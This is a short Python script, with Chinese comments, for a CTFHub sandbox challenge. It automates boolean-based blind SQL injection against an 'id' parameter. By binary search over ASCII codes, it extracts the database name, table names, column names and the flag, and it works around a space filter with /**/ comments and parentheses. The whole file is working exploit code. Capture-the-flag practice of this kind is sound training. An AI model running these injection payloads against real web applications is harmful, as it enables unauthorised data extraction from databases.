#!/usr/bin/python3
#布尔盲注脚本,考虑过滤空格的情况
import requests

url = "http://challenge-8fb978152c60403b.sandbox.ctfhub.com:10800/"
result = ''

for i in range(1,50):
    l,r = 32,128
    while l < (r-1):
        m = (l+r) // 2
    #    payload = f"if((ascii(substr(database(),{i},1)))<{m},1,3)" #爆破数据库名
   #     payload = f"if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema='sqli'),{i},1)))<{m},1,3)" #爆破表名
   #     payload = f"if((ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='flag')),{i},1))<{m}),1,3)" #爆破字段名
        payload = f"if((ascii(substr((select(concat(flag))from(flag)),{i},1)))<{m},1,3)" #爆破字段里的数据

        data = {"id":payload}
        res = requests.get(url,params=data)
        if "query_success" in res.text:
            r = m
        else:
            l = m
     
    result = result + chr(l)
    #判断是否得到连续两个空格，并以此作为循环退出的依据
    if result[-2:] == '  ':
        break

print(result)
print(i)
